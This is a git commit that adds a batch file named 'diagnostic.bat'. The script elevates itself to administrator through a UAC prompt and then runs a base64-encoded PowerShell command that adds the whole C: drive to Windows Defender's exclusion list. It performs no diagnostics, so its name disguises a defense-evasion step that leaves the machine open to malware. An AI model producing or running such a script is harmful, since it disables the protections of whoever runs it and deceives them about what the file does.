f86241f44310ab7a0c92d06c155eb87d8e068827
huy32121 <summertimeholocaust@o2.pl>
2025-02-28 13:26:49 +0100

    Add files via upload

---
+++ diagnostic.bat
@@ -0,0 +1,7 @@
+@echo off
+openfiles >nul 2>nul
+if %errorlevel% neq 0 (
+    powershell -Command "Start-Process cmd.exe -ArgumentList '/c, %~s0' -Verb runAs"
+    exit
+)
+powershell -enc QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACIAQwA6AFwAIgA=
